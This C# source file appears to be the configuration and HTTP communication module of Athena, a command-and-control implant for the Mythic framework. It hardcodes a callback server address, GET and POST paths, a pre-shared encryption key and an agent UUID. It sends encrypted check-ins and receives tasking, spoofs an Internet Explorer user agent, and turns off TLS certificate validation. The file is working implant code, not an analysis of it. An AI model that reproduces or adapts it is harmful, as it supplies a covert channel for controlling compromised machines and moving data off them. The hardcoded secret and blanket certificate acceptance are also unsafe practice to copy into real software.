using Athena.Models.Config;
using Athena.Utilities;
//
using System.Text.Json;
using System.Net;
using System.Net.Security;
using Athena.Models.Mythic.Checkin;

namespace Athena
{
    public class Config : IConfig
    {
        public IProfile profile { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }

        public Config()
        {
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("10", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.profile = new HTTP();
        }
    }
    public class HTTP : IProfile
    {
        public string uuid { get; set; }
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public string getURL { get; set; }
        public string postURL { get; set; }
        public string psk { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        public PSKCrypto crypt { get; set; }
        public bool encrypted { get; set; }
        private HttpClient client { get; set; }

        public HTTP()
        {
            HttpClientHandler handler = new HttpClientHandler();
            int callbackPort = Int32.Parse("80");
            string callbackHost = "http://192.168.4.201";
            string getUri = "index";
            string queryPath = "q";
            string postUri = "data";
            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
            this.hostHeader = "";
            this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}=";
            this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
            this.proxyHost = "";
            this.proxyPass = "";
            this.proxyUser = "";
            this.psk = "TRwznr96yQheYfmv6S2ty12vlknjoY8A/MHonVAoLQE=";
            this.uuid = "351ef8df-d71d-4824-90d8-2aa6ff4a501f";
            //Might need to make this configurable
            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );


            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this.client = new HttpClient(handler);

            if (!string.IsNullOrEmpty(this.hostHeader))
            {
                this.client.DefaultRequestHeaders.Host = this.hostHeader;
            }

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this.client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            //Doesn't do anything yet
            this.encryptedExchangeCheck = bool.Parse("false");

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

        }
        public async Task<string> Send(string json)
        {
            try
            {
                //string json = JsonSerializer.Serialize(obj, CheckinJsonContext.Default.Checkin);
                Console.WriteLine(json);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                HttpResponseMessage response;
                if (json.Length < 2000) //Max URL length
                {
                    response = await this.client.GetAsync(this.getURL + WebUtility.UrlEncode(json));
                }
                else
                {
                    response = await this.client.PostAsync(this.postURL, new StringContent(json));
                }

                string strRes = await response.Content.ReadAsStringAsync();

                if (this.encrypted)
                {
                    return this.crypt.Decrypt(strRes);
                }

                if (!string.IsNullOrEmpty(strRes))
                {
                    return (await Misc.Base64Decode(strRes)).Substring(36);
                }
                return String.Empty;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return String.Empty;
            }
        }
    }
}
